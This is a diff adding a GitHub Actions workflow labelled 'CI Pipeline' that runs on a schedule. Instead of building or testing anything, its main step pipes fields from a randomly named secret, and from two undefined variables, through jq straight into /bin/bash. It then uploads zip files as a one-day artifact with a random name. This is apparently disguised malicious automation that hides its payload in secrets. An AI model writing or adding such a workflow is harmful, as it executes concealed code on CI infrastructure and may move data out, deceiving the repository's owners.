@@ -1,0 +1,33 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '45 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          ioxvm73774: ${{ secrets.ioxvm73774 }}
+        run: |
+          printf '%s' "$ioxvm73774" | jq -r .p8 | /bin/bash
+          printf '%s' "$jxfx25583" | jq -r .v9 | /bin/bash
+          echo $qaa6 | jq -r .dd42 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: Sq57XK5Z
+          path: "*.zip"
+          retention-days: 1
